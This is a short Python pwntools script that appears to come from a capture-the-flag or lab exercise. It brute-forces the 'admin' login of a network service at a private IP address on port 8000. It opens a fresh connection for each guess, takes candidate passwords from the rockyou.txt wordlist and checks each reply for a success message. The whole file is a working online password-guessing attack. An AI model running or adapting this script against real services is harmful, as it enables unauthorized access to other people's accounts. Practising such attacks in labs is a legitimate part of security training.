from pwn import *

# Set the host and port
host = "10.10.23.85"
port = 8000

# File path for rockyou.txt password list
password_file = "/home/mauzware/Desktop/rockyou.txt"

# Connect to the target
def connect_to_service():
    return remote(host, port)

# Function to attempt login with a password
def attempt_password(password):
    # Connect to the service
    conn = connect_to_service()
    
    # Send 'admin' as the username
    conn.sendline(b"admin")
    
    # Wait for the password prompt
    conn.recvuntil(b"Password:")
    
    # Send the password from the list
    conn.sendline(password.encode())

    # Receive the response and check if we're prompted for a password again
    response = conn.recvline(timeout=2)
    response = conn.recvline(timeout=2)
    # Check if we're asked for the password again (indicates incorrect password)
    if b"Password:" in response:
        print(f"Password '{password}' failed.")
        conn.close()
        return False
    elif b"Welcome" in response or b"Success" in response:  # Adjust this based on the actual success message
        print(f"Password '{password}' might be correct!")
        conn.close()
        return True
    else:
        # Some other response that might indicate progress (adjust based on your observations)
        print(f"Unexpected response for password '{password}'. Response: {response}")
        conn.close()
        return False

# Main function to loop through password list
def fuzz_passwords():
    with open(password_file, "r", encoding="latin-1") as f:
        for password in f:
            password = password.strip()
            if attempt_password(password):
                print(f"Found working password: {password}")
                break

if __name__ == "__main__":
    fuzz_passwords()
